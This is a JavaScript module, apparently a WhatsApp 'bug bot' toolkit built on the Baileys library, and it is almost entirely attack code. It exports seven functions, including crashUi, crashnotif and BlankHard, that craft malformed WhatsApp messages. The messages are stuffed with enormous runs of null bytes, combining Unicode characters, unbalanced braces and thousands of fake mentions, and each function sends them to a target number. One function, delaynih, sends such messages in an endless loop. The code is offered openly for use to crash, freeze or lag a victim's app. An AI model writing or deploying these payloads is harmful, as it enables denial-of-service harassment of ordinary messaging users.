const {
  default: makeWASocket,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessage,
  areJidsSameUser,
  WAMessageStatus,
  AuthenticationState,
  GroupMetadata,
  getContentType,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");
async function delaynih(sock, target) {
  while (true) {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
              version: 3,
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000)
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            },
            body: { 
              format: "DEFAULT",
              text: "THIS IS - EVIL" 
            }
          }
        }
      }
    }, {
      messageTimestamp: (Date.now() / 1000) | 0,
      userJid: target,
      messageId: undefined
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }],
      messageId: msg.key?.id || undefined,
      statusJidList: [target]
    }, { 
      participant: target 
    });
  }
}

async function crashUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: { 
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000), 
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}
async function crashnotif(sock, target) {
  if (!sock || !target) {
    return;
  }
  const VoidSystemPayload = "VOID - ENGINE" +
    "ꦽ".repeat(10000) +
    "𑇂𑆵𑆴𑆿".repeat(10000) +
    "꙰⃟".repeat(10000) +
    "\u0000".repeat(10000) +
    "𑜦𑜠".repeat(10000);
  try {
    const XandroidUi = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "OKAY", 
                    url: "https://" + "𑜦𑜠".repeat(5000) + ".com" 
                  })
                }
              ]
            },
            contextInfo: {
              externalAdReply: {
                renderLargerThumbnail: false,
                showAdAttribution: false
              }
            }
          }
        }
      }
    };
    try {
      await sock.relayMessage(target, XandroidUi, {
        messageId: sock.generateMessageTag()
      });
      console.log(`done`);
    } catch (sendError) {
      console.error(`ga:`, sendError.message);
    }
    console.log(`done`);
  } catch (error) {
    console.error(`ga:`, error.message);
  }
}
async function ATRXios(sock, target) {
  await sock.relayMessage(target, {
    botInvokeMessage: {
      message: {
        interactiveMessage: {
          body: { text: "🍷 XIOS BY DOYANG" + "ꦽ".repeat(5000) },
          nativeFlowMessage: {
            buttons: [{ name: "cta_url", buttonParamsJson: "{}" }]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}
async function AndroXIos(sock, target) {
    const msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "᬴",
                            productMessage: {
                                product: {
                                    productImage: {
                                      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQPsAj-IxLPUhYzu1R8Nw6yDp6ppYKK5fJ09XJF2XpXSU1Bew2GHgnvaIJ0O9iZmuHGs1RUQCo914X8dVgk3gC308eXj841YUQJ3EZZgUg?ccb=9-4&oh=01_Q5Aa3gHiHHKq21as6MtdzN0UP3GTO4IutG48rchGVSrr2ZM2VQ&oe=69A7A69C&_nc_sid=e6ed6c&mms3=true",
                                      directPath: "/o1/v/t24/f2/m232/AQPsAj-IxLPUhYzu1R8Nw6yDp6ppYKK5fJ09XJF2XpXSU1Bew2GHgnvaIJ0O9iZmuHGs1RUQCo914X8dVgk3gC308eXj841YUQJ3EZZgUg?ccb=9-4&oh=01_Q5Aa3gHiHHKq21as6MtdzN0UP3GTO4IutG48rchGVSrr2ZM2VQ&oe=69A7A69C&_nc_sid=e6ed6c",
                                      mimetype: "image/jpeg",
                                      mediaKey: "+Zs9DoeJz+J2mzwQCkgBfhtjAiv33zYhGr2Mz6yNLyw=",
                                      fileEncSha256: "L+ZqvEZJ/YNP7ojtGKPs9bH2H28NEyi73QnB/QLEEsw=",
                                      fileSha256: "PHi+bVRyCbOCe0WeahEF9S/e+DCVkirim2ITX25N9Hk=",
                                      fileLength: { low: 0, high: 1, unsigned: true },
                                      mediaKeyTimestamp: { low: 1738880389, high: 0, unsigned: false }
                                    },
                                    productId: "449756950375071",
                                    title: "᬴",
                                    priceAmount1000: { low: 999, high: 0, unsigned: false },
                                    url: "t.me/primroseell",
                                    productImageCount: 1661992960,
                                    firstImageId: "99999999",
                                    salePriceAmount1000: {
                                        low: -1981284353,
                                        high: -1966660860,
                                        unsigned: false
                                    }
                                },
                                businessOwnerJid: "13135559098@s.whatsapp.net",
                                contextInfo: {
                                    remoteJid: " Raja iblis ",
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + " 0@s.whatsapp.net")
                                    ]
                                }
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "᬴"
                        },
                        contextInfo: {
                            remoteJid: " Raja iblis ",
                            mentionedJid: [
                                "13135559098@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + " 0@s.whatsapp.net")
                            ],
                            "externalAdReply": {
                              "automatedGreetingMessageShown": true,
                              "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
                              "greetingMessageBody": "\u0000"
                           }
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "᬴".repeat(60000),
                                        sections: []
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }),
        {
            userJid: target
        }
    );
    
  await sock.relayMessage(target, msg.message, {
     participant: {
        jid: target
      },
     messageId: msg.key.id
    }, {});
}

async function BlankHard(sock, target) {
  const Vnx = {
    
newsletterAdminInviteMessage: {
      newsletterJid: "123456789@newsletter",
      inviteCode: "𑜦𑜠".repeat(120000),
      inviteExpiration: 99999999999,
      newsletterName: "ោ៝" + "ꦾ".repeat(250000),
      body: {
        text: "Inpo Bokep 🥵" + "ી".repeat(250000)
      },
    },
  };

  await sock.relayMessage(target, Vnx, { participant: { jid: target } });
}

async function BulldozerMaklu(sock, target) {
  const msg = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: Buffer.from([
        226, 213, 217, 102, 205, 126, 232, 145,
        0, 70, 137, 73, 190, 145, 0, 44,
        165, 102, 153, 233, 111, 114, 69, 10,
        55, 61, 186, 131, 245, 153, 93, 211
      ]),
      fileLength: 432722,
      seconds: 26,
      ptt: false,
      mediaKey: Buffer.from([
        182, 141, 235, 167, 91, 254, 75, 254,
        190, 229, 25, 16, 78, 48, 98, 117,
        42, 71, 65, 199, 10, 164, 16, 57,
        189, 229, 54, 93, 69, 6, 212, 145
      ]),
      fileEncSha256: Buffer.from([
        29, 27, 247, 158, 114, 50, 140, 73,
        40, 108, 77, 206, 2, 12, 84, 131,
        54, 42, 63, 11, 46, 208, 136, 131,
        224, 87, 18, 220, 254, 211, 83, 153
      ]),
      directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1746275400,
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        isSampled: true,
        participant: target,
        remoteJid: "status@broadcast",
        forwardingScore: 9741,
        isForwarded: true
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}
module.exports = { crashnotif, delaynih, BlankHard, ATRXios, AndroXIos, crashUi, BulldozerMaklu }